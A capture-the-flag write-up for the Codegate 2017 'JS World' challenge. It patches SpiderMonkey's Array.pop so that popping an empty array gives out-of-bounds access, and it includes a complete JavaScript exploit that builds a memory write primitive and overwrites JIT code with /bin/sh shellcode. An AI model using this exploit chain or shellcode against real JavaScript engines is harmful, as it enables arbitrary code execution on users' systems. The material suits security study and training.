# Codegate 2017 Qual: JS World

## Setting up Environments

### Patch

/mozjs-24.2.0/js/src/jsarray.cpp
```cpp
1946     /* Steps 4-5. */
1947     if (index == 0) {
1948         /* Step 4b. */
1949         args.rval().setUndefined();
1950     } else {
----
1946     /* Steps 4-5. */
1947     if (false) {
1948         /* Step 4b. */
1949         args.rval().setUndefined();
1950     } else {
```

```cpp
1967     if (obj->isNative() && obj->getDenseInitializedLength() > index)
1968         obj->setDenseInitializedLength(index);
----
1967     if (obj->isNative())
1968         obj->setDenseInitializedLength(index);
```

### Build

```
$ mkdir mozilla
$ cd mozilla
$ wget http://ftp.mozilla.org/pub/mozilla.org/js/mozjs-24.2.0.tar.bz2
$ tar xjf mozjs-24.2.0.tar.bz2
$ CXXFLAGS="-fpermissive" ../mozjs-24.2.0/js/src/configure
```

### Debug

/mozjs-24.2.0/js/src/jit/BaselineJIT.cpp

```cpp
104     printf("jitcode Address: %lx\n", data.jitcode);
```

---

## Exploit

### Vulnerability

We patched jsarray to not check array length is 0.
So we can pop from empty array that makes arbitary read/write.

```js
a = []
a.pop()
print("length: " + a.length)
for(var i = 300; i < 350; i++)
    print(a[i])
```

### Debug

Call `Math.atan()` and set breakpoint in gdb `b *js::math_atan`  
Argument is in `vp+0x16`

```js
a = [0x41414141, 0x51515151, 0x61616161]
a.length = 0xdeadbeef
print("length: " + a.length)
Math.atan(a)
```

### PoC

```js
function dtoi(d) {
    const i = new Uint32Array(new Float64Array([d]).buffer);
    return [i[1], i[0]];
}

function itod(i) {
    return new Float64Array(new Uint32Array([i[1], i[0]]).buffer)[0];
}

function hex(i) {
    const v0 = ("00000000" + i[1].toString(16)).substr(-8);
    const v1 = ("00000000" + i[0].toString(16)).substr(-8);
    return "0x" + v1 + v0;
}

function unhex(h) {
    const i0 = parseInt(h.substr(10, 8), 16);
    const i1 = parseInt(h.substr(2, 8), 16);
    return [i1, i0];
}

function shell() {
    version();
}

oob_arr = [0x1111];
arr = [0xdeadbeef];

oob_arr.pop();
oob_arr.pop();

print(oob_arr.length);

arr_offset = 0;
for(let i = 0; i < 0x100; i++) {
    if(hex(dtoi(oob_arr[i])) == "0x41ebd5b7dde00000") { // double(0xdeadbeef)
        arr_offset = i-3;
        print("[+] Arr Offset Found: " + arr_offset + " " + hex(dtoi(oob_arr[arr_offset])));
        break;
    }
}

for(let i = 0; i < 20; i++) {
    shell();
}

jitaddr_offset = 0;
for(let i = 0; i < 0x10000; i++) {
    if(hex(dtoi(oob_arr[i])) == "0x0000015000000161") {
        jitaddr_offset = i-2;
        print("[+] JIT Addr Offset Found: " + jitaddr_offset + " " + hex(dtoi(oob_arr[jitaddr_offset])));
        break;
    }
}

function write8(addr, value) {
    oob_arr[arr_offset] = itod(addr);
    arr[0] = itod(value);
}

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

while(shellcode.length % 8)
    shellcode += "\x90"

addr = dtoi(oob_arr[jitaddr_offset]);

for(let i = 0; i < shellcode.length; i+=8) {
    let sc_block = "0x";
    for(let j = 7; j >= 0; j--) {
        sc_block += ("00" + shellcode.charCodeAt(i+j).toString(16)).substr(-2);
    }

    write8(addr, unhex(sc_block));
    addr[1] += 8;
}

shell();
```

---

## Reference

- https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/